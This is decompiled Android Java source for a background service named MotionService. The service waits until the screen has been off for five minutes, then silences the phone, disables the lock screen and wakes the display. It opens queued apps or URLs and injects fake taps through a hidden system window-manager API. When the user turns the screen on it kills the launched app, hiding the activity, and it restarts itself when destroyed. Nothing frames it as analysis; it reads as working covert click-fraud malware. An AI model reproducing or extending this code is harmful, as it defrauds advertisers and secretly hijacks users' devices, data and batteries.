package com.qc.access;

import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.KeyguardManager;
import android.app.KeyguardManager.KeyguardLock;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.os.SystemClock;
import android.util.DisplayMetrics;
import android.view.IWindowManager;
import android.view.IWindowManager.Stub;
import android.view.MotionEvent;
import android.view.WindowManager;
import com.qc.base.OrderSet;
import com.qc.base.QCMainCourse;
import com.qc.common.Funs;
import com.qc.common.ThreadPool;
import com.qc.entity.MotionActive;
import com.qc.entity.SilenceApkInfo;
import com.qc.entity.SilencePager;
import com.qc.util.ShareProDBHelper;
import java.util.List;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

@SuppressLint({"HandlerLeak"})
public class MotionService extends Service {
    /* access modifiers changed from: private */
    public SilenceApkInfo aliveApk;
    BroadcastReceiver broadcast = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction().equals("android.intent.action.SCREEN_OFF")) {
                MotionService.this.stopAll(MotionService.this.mContext);
                MotionService.this.init();
                if ((OrderSet.aliveApps != null && OrderSet.aliveApps.size() >= 1) || ((OrderSet.clickApps != null && OrderSet.clickApps.size() >= 1) || (OrderSet.openPager != null && OrderSet.openPager.size() >= 1))) {
                    if (OrderSet.aliveApps != null && OrderSet.aliveApps.size() > 0) {
                        MotionService.this.aliveApk = (SilenceApkInfo) OrderSet.aliveApps.poll();
                        if (MotionService.this.aliveApk.getIsrun() == 1 && Funs.isInstallApk(context, MotionService.this.aliveApk.getPackageName())) {
                            Funs.startAPKByPackageName(context, MotionService.this.aliveApk.getPackageName());
                            if (MotionService.this.aliveApk.getIsclose() == 1 && MotionService.this.aliveApk.getDelay() > 0) {
                                QCMainCourse.startAppShutDownHandler(context, MotionService.this.aliveApk.getPackageName(), MotionService.this.aliveApk.getDelay());
                            }
                        }
                    }
                    if ((OrderSet.clickApps != null && OrderSet.clickApps.size() > 0) || OrderSet.openPager != null || OrderSet.openPager.size() > 0) {
                        MotionService.this.timer = new Timer();
                        MotionService.this.task = MotionService.this.getTask();
                        MotionService.this.timer.schedule(MotionService.this.task, MotionService.this.lock_delay);
                    }
                }
            } else if (intent.getAction().equals("android.intent.action.SCREEN_ON")) {
                if (MotionService.this.aliveApk != null) {
                    Funs.forceStopProcess(context, MotionService.this.aliveApk.getPackageName());
                }
                if (MotionService.this.timer != null) {
                    MotionService.this.task = null;
                    MotionService.this.timer.cancel();
                    MotionService.this.timer = null;
                }
            }
        }
    };
    private SilenceApkInfo clickApk;
    /* access modifiers changed from: private */
    public int currentLevel = 0;
    /* access modifiers changed from: private */
    public MotionActive currentMotionActive;
    /* access modifiers changed from: private */
    public List<MotionActive> currentMotionActives;
    private long first_delay = 0;
    Handler handler = new Handler() {
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            switch (msg.what) {
                case ThreadPool.PRIORITY_LOW /*0*/:
                    MotionService.this.OpenAppAndTouchThread();
                    return;
                case 1:
                    MotionService.this.DoTouchEventAction(MotionService.this.mContext);
                    return;
                case 2:
                    MotionService.this.motionThread = MotionService.this.getMotionThread();
                    MotionService.this.motionThread.setPriority(10);
                    MotionService.this.motionThread.start();
                    return;
                case ShareProDBHelper.INTEGERVALUE /*3*/:
                    MotionService.this.stopSelf();
                    return;
                default:
                    return;
            }
        }
    };
    private boolean isResumeRing = false;
    private KeyguardLock key_lock;
    private KeyguardManager key_manager;
    /* access modifiers changed from: private */
    public int levelCount = 0;
    /* access modifiers changed from: private */
    public long lock_delay = 300000;
    /* access modifiers changed from: private */
    public Context mContext;
    private WakeLock mWake;
    private WakeLock mWakeLock;
    /* access modifiers changed from: private */
    public Thread motionThread;
    /* access modifiers changed from: private */
    public boolean motion_flag = false;
    private String openUrl = "";
    private String packageName = "";
    private int sHeigth;
    private int sWidth;
    private SilencePager silencePager;
    /* access modifiers changed from: private */
    public TimerTask task;
    /* access modifiers changed from: private */
    public Timer timer;
    /* access modifiers changed from: private */
    public long touch_delay = 0;
    private IWindowManager windowMger;

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        this.mContext = this;
        WindowManager wm = (WindowManager) getSystemService("window");
        DisplayMetrics dm = new DisplayMetrics();
        wm.getDefaultDisplay().getMetrics(dm);
        this.sWidth = dm.widthPixels;
        this.sHeigth = dm.heightPixels;
        IntentFilter filter = new IntentFilter();
        filter.addAction("android.intent.action.SCREEN_OFF");
        filter.addAction("android.intent.action.SCREEN_ON");
        filter.addAction("android.intent.action.USER_PRESENT");
        registerReceiver(this.broadcast, filter);
        this.key_manager = (KeyguardManager) getSystemService("keyguard");
        this.key_lock = this.key_manager.newKeyguardLock("unLock");
        acquireWakeLock();
    }

    public void onDestroy() {
        super.onDestroy();
        try {
            unregisterReceiver(this.broadcast);
        } catch (Exception e) {
        }
        stopAll(this.mContext);
        init();
        lockScreen();
        releaseWakeLock();
        if ((OrderSet.clickApps != null && OrderSet.clickApps.size() > 0) || ((OrderSet.openPager != null && OrderSet.openPager.size() > 0) || (OrderSet.aliveApps != null && OrderSet.aliveApps.size() > 0))) {
            startService(new Intent(this, MotionService.class));
        }
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }

    public Thread getMotionThread() {
        return new Thread() {
            public void run() {
                do {
                    try {
                        if (MotionService.this.motion_flag) {
                            if (MotionService.this.levelCount < 10 && MotionService.this.currentMotionActives != null && MotionService.this.currentMotionActives.size() > 0) {
                                for (int i = 0; i < MotionService.this.currentMotionActives.size(); i++) {
                                    if (((MotionActive) MotionService.this.currentMotionActives.get(i)).getAstep() == MotionService.this.currentLevel) {
                                        MotionService.this.currentMotionActive = (MotionActive) MotionService.this.currentMotionActives.get(i);
                                        MotionService.this.touch_delay = MotionService.this.currentMotionActive.getAdelay();
                                        MotionService.this.currentMotionActives.remove(i);
                                        break;
                                    }
                                }
                            }
                            AnonymousClass3.sleep(MotionService.this.touch_delay * 1000);
                        }
                        MotionService.this.handler.sendEmptyMessage(1);
                        MotionService.this.motion_flag = true;
                    } catch (InterruptedException e) {
                        MotionService.this.stopSelf();
                    }
                } while (MotionService.this.motion_flag);
                super.run();
            }
        };
    }

    /* access modifiers changed from: private */
    public void DoTouchEventAction(Context context) {
        int motionType = 0;
        int currentX = 0;
        int currentY = 0;
        int currentR = 0;
        if (this.currentMotionActive != null) {
            if (this.currentMotionActive.getAtype3() == 1) {
                motionType = 3;
            } else if (this.currentMotionActive.getAtype1() != null && this.currentMotionActive.getAtype1().length() > 0) {
                String[] xyArray = this.currentMotionActive.getAtype1().split(",");
                if (xyArray.length == 2) {
                    currentX = Integer.parseInt(xyArray[0]);
                    currentY = Integer.parseInt(xyArray[1]);
                    motionType = 1;
                }
            } else if (this.currentMotionActive.getAtype2() == null || this.currentMotionActive.getAtype2().length() <= 0) {
                motionType = 3;
                this.levelCount = 10;
            } else {
                String[] xyrArray = this.currentMotionActive.getAtype2().split(",");
                if (xyrArray.length == 3) {
                    currentX = Integer.parseInt(xyrArray[0]);
                    currentY = Integer.parseInt(xyrArray[1]);
                    currentR = Integer.parseInt(xyrArray[2]);
                    motionType = 2;
                }
            }
            switch (motionType) {
                case 1:
                    if (this.currentLevel <= this.levelCount) {
                        if (this.currentLevel == this.levelCount) {
                            this.motion_flag = false;
                            break;
                        }
                    }
                    stopSelf();
                    return;
                    break;
                case 2:
                    if (this.currentLevel <= this.levelCount) {
                        Random random2 = new Random();
                        currentX += random2.nextInt(currentR * 2) - currentR;
                        currentY += random2.nextInt(currentR * 2) - currentR;
                        if (this.currentLevel == this.levelCount) {
                            this.motion_flag = false;
                            break;
                        }
                    }
                    stopSelf();
                    return;
                    break;
                case ShareProDBHelper.INTEGERVALUE /*3*/:
                    if (this.currentLevel <= this.levelCount) {
                        Random random1 = new Random();
                        currentX = random1.nextInt(this.sWidth);
                        currentY = random1.nextInt(this.sHeigth);
                        if (this.currentLevel == 10) {
                            this.motion_flag = false;
                            break;
                        }
                    }
                    stopSelf();
                    return;
                    break;
            }
            this.currentLevel++;
            DosendPointerSyncAction(context, currentX, currentY);
            return;
        }
        stopSelf();
    }

    private void DosendPointerSyncAction(Context context, int x, int y) {
        if (!Funs.isCreenOn(this.mContext)) {
            stopAll(this.mContext);
            init();
        }
        if (((RunningTaskInfo) ((ActivityManager) getSystemService("activity")).getRunningTasks(1).get(0)).topActivity.getPackageName().equals(this.packageName)) {
            try {
                Object object = new Object();
                this.windowMger = Stub.asInterface((IBinder) Class.forName("android.os.ServiceManager").getMethod("getService", new Class[]{String.class}).invoke(object, new Object[]{new String("window")}));
                MotionEvent event_down = MotionEvent.obtain(SystemClock.uptimeMillis(), SystemClock.uptimeMillis(), 0, (float) x, (float) y, 0);
                MotionEvent event_up = MotionEvent.obtain(SystemClock.uptimeMillis(), SystemClock.uptimeMillis(), 1, (float) x, (float) y, 0);
                this.windowMger.injectPointerEvent(event_down, true);
                this.windowMger.injectPointerEvent(event_up, true);
                return;
            } catch (Exception e) {
                return;
            }
        }
        stopSelf();
    }

    /* access modifiers changed from: private */
    public void OpenAppAndTouchThread() {
        if (!Funs.isSilentMode(this.mContext)) {
            this.isResumeRing = true;
            Funs.silent(this.mContext);
        }
        int i;
        if (OrderSet.clickApps != null && OrderSet.clickApps.size() > 0) {
            this.clickApk = (SilenceApkInfo) OrderSet.clickApps.poll();
            this.currentMotionActives = this.clickApk.getActivelist();
            this.packageName = this.clickApk.getPackageName();
            this.levelCount = this.clickApk.getActivelist().size();
            this.currentLevel = 1;
            if (this.currentMotionActives != null && this.currentMotionActives.size() > 0) {
                i = 0;
                while (i < this.currentMotionActives.size()) {
                    if (((MotionActive) this.currentMotionActives.get(i)).getAstep() == this.currentLevel) {
                        this.currentMotionActive = (MotionActive) this.currentMotionActives.get(i);
                        this.first_delay = this.currentMotionActive.getAdelay();
                        if (this.currentMotionActive.getAtype3() == 1) {
                            this.touch_delay = this.currentMotionActive.getAdelay();
                            this.levelCount = 10;
                        }
                        this.currentMotionActives.remove(i);
                    } else {
                        i++;
                    }
                }
            }
            if (this.first_delay == 0) {
                this.first_delay = 5;
                this.touch_delay = 5;
            }
            try {
                Intent mIntent = getPackageManager().getLaunchIntentForPackage(this.packageName);
                if (mIntent != null) {
                    startActivity(mIntent);
                    this.handler.sendEmptyMessageDelayed(2, this.first_delay * 1000);
                } else {
                    this.handler.sendEmptyMessageDelayed(3, this.first_delay * 1000);
                }
            } catch (Exception e) {
                this.handler.sendEmptyMessageDelayed(3, this.first_delay * 1000);
            }
        } else if ((OrderSet.openPager != null || OrderSet.openPager.size() > 0) && (OrderSet.clickApps == null || OrderSet.clickApps.size() < 1)) {
            if (Funs.isHasConnected(this.mContext)) {
                this.silencePager = (SilencePager) OrderSet.openPager.poll();
                this.openUrl = this.silencePager.getUrl();
                this.currentMotionActives = this.silencePager.getActivies();
                this.currentLevel = 1;
                this.levelCount = this.silencePager.getActivies().size();
                if (this.currentMotionActives != null && this.currentMotionActives.size() > 0) {
                    i = 0;
                    while (i < this.currentMotionActives.size()) {
                        if (((MotionActive) this.currentMotionActives.get(i)).getAstep() == this.currentLevel) {
                            this.currentMotionActive = (MotionActive) this.currentMotionActives.get(i);
                            this.first_delay = this.currentMotionActive.getAdelay();
                            if (this.currentMotionActive.getAtype3() == 1) {
                                this.touch_delay = this.currentMotionActive.getAdelay();
                                this.levelCount = 10;
                            }
                            this.currentMotionActives.remove(i);
                        } else {
                            i++;
                        }
                    }
                }
                this.packageName = Funs.openWebByConfirmBrawable(this.mContext, this.openUrl);
                if (this.first_delay == 0) {
                    this.first_delay = 5;
                    this.touch_delay = 5;
                }
                if (this.packageName.length() > 0) {
                    this.handler.sendEmptyMessageDelayed(2, this.first_delay * 5000);
                } else {
                    this.handler.sendEmptyMessageDelayed(3, this.first_delay * 5000);
                }
            } else {
                stopAll(this.mContext);
                init();
                return;
            }
        }
        unlockScreen();
    }

    private void unlockScreen() {
        this.mWake = ((PowerManager) getSystemService("power")).newWakeLock(268435462, "bright");
        this.mWake.acquire();
        this.key_lock.disableKeyguard();
    }

    private void lockScreen() {
        if (this.mWake != null) {
            try {
                this.mWake.release();
            } catch (Exception e) {
            }
            this.mWake = null;
        }
        this.key_lock.reenableKeyguard();
    }

    /* access modifiers changed from: private */
    public TimerTask getTask() {
        return new TimerTask() {
            public void run() {
                Message msg = new Message();
                msg.what = 0;
                MotionService.this.handler.sendMessage(msg);
            }
        };
    }

    /* access modifiers changed from: private */
    public void stopAll(Context context) {
        this.motion_flag = false;
        if (this.motionThread != null) {
            try {
                this.motionThread.interrupt();
                this.motionThread = null;
            } catch (Exception e) {
            }
        }
        if (this.task != null) {
            this.task.cancel();
            this.task = null;
        }
        if (this.timer != null) {
            this.timer.cancel();
            this.timer = null;
        }
        Funs.returnDesk(context);
        if (this.isResumeRing) {
            Funs.ring_open(this.mContext);
            this.isResumeRing = false;
        }
    }

    public void acquireWakeLock() {
        if (this.mWakeLock == null) {
            this.mWakeLock = ((PowerManager) getSystemService("power")).newWakeLock(536870913, "bright");
            if (this.mWakeLock != null) {
                try {
                    this.mWakeLock.acquire();
                } catch (Exception e) {
                }
            }
        }
    }

    private void releaseWakeLock() {
        if (this.mWakeLock != null) {
            try {
                this.mWakeLock.release();
            } catch (Exception e) {
            }
            this.mWakeLock = null;
        }
    }

    /* access modifiers changed from: private */
    public void init() {
        this.levelCount = 0;
        this.motion_flag = false;
        this.silencePager = null;
        this.clickApk = null;
        this.openUrl = "";
        this.packageName = "";
        this.currentLevel = 0;
        this.levelCount = 0;
        this.currentMotionActive = null;
        this.currentMotionActives = null;
        this.first_delay = 0;
        this.touch_delay = 0;
    }
}
